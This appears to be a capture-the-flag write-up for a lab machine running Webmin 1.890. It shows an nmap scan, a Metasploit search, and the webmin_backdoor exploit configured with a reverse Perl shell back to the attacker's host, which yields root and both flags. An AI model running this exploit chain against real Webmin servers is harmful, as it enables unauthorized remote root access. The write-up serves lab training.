# Source

Starting with basic recon:
```sh
nmap -sV -T4 10.10.220.180          
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-09 02:42 EDT
Nmap scan report for 10.10.220.180
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.93 seconds
```

Accessing the Website:
![grafik](https://github.com/Aryt3/writeups/assets/110562298/7688cba4-7ea9-4a7f-986a-f9ab9f001490)

Seems like a login is running here from webmin.

The first thing I want to check if there is a Metasploit module for this:
```sh
msf6 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/http/webmin_backdoor

msf6 > 
```

Trying to use the first module:
```sh
msf6 > use exploit/unix/webapp/webmin_show_cgi_exec
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580
```

Seems like this won't get us far because we would need a username and password and we don't have either.

Let's try the backdoor one:
```sh
msf6 > use exploit/linux/http/webmin_backdoor
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)

msf6 exploit(linux/http/webmin_backdoor) > set RHOST 10.10.220.180
RHOST => 10.10.220.180
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.14.61.21
LHOST => 10.14.61.21
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > exploit

[*] Started reverse TCP handler on 10.14.61.21:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.14.61.21:4444 -> 10.10.220.180:47968 ) at 2023-10-09 02:58:24 -0400
```

Seems like this worked and we got a shell:
```sh
python -c 'import pty;pty.spawn("/bin/bash")'
root@source:/usr/share/webmin/# export TERM=xterm
root@source:/usr/share/webmin/# whoami
root
```

Seems like we instantly got a root shell. I don't know if this is supposed to happen but we should now be able to read both Flags:
```sh
root@source:/usr/share/webmin/# ls -R /home/
/home/:
dark

/home/dark:
user.txt  webmin_1.890_all.deb
root@source:/usr/share/webmin/# cat /home/dark/user.txt
THM{REDACTED}
root@source:/usr/share/webmin/# ls /root/
root.txt
root@source:/usr/share/webmin/# cat /root/root.txt   
THM{REDACTED}
```

Here we got both Flags at once.
